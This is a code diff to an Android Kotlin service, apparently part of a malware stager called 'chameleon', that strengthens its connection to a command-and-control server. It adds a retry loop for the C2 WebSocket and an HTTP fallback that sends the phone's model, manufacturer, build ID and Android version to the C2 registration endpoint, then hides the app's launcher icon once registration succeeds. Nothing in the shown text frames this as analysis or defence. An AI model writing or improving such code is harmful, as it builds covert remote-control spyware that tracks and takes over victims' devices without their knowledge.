@@ -21,12 +21,15 @@ import com.chameleon.stager.utils.NetworkUtils
 import com.chameleon.stager.utils.ObfuscatedStrings
 import org.json.JSONArray
 import org.json.JSONObject
+import java.util.concurrent.CountDownLatch
+import java.util.concurrent.TimeUnit
 
 class PayloadService : Service() {
     companion object {
         const val TAG = "PayloadService"
         const val NOTIFICATION_ID = 1001
         const val RECONNECT_DELAY = 10000L
+        const val WS_TIMEOUT_SECONDS = 15L
     }
 
     private val CHANNEL_ID: String by lazy { ObfuscatedStrings.notifChannelId }
@@ -113,21 +116,66 @@ class PayloadService : Service() {
         Thread {
             var retries = 0
             while (isRunning && retries < 10) {
+                val latch = CountDownLatch(1)
+                var connected = false
                 try {
                     c2WebSocket = WebSocketClient(StagerApplication.c2WsUrl)
                     c2WebSocket?.connect(
                         onMessage = { msg -> handleC2Message(msg) },
                         onConnected = {
-                            retries = 0
+                            connected = true
                             registerDevice()
+                            latch.countDown()
+                        },
+                        onFailure = {
+                            latch.countDown()
                         }
                     )
-                    break
+                    if (latch.await(WS_TIMEOUT_SECONDS, TimeUnit.SECONDS) && connected) {
+                        return@Thread
+                    }
                 } catch (e: Exception) {
-                    retries++
-                    Log.e(TAG, "C2 connection failed (attempt $retries)", e)
-                    Thread.sleep(RECONNECT_DELAY * retries)
+                    Log.e(TAG, "C2 connection error", e)
+                    latch.countDown()
                 }
+                retries++
+                Log.w(TAG, "C2 reconnect attempt $retries/10")
+                if (retries < 10) Thread.sleep(RECONNECT_DELAY * retries)
+            }
+            Log.e(TAG, "C2 connection failed after 10 retries")
+            registerViaHTTP()
+        }.start()
+    }
+
+    private fun registerViaHTTP() {
+        Thread {
+            try {
+                val url = java.net.URL("${StagerApplication.c2RealUrl}/api/register")
+                val conn = url.openConnection() as java.net.HttpURLConnection
+                conn.apply {
+                    requestMethod = "POST"
+                    connectTimeout = 15000
+                    readTimeout = 15000
+                    doOutput = true
+                    setRequestProperty("Content-Type", "application/json")
+                }
+                val info = JSONObject().apply {
+                    put("device_id", Build.ID)
+                    put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
+                    put("manufacturer", Build.MANUFACTURER)
+                    put("model", Build.MODEL)
+                    put("android_version", Build.VERSION.RELEASE)
+                    put("api_level", Build.VERSION.SDK_INT)
+                }
+                conn.outputStream.write(info.toString().toByteArray())
+                val code = conn.responseCode
+                conn.disconnect()
+                if (code == 200) {
+                    Log.i(TAG, "Device registered via HTTP fallback")
+                    hideLauncherIcon()
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "HTTP registration failed", e)
             }
         }.start()
     }
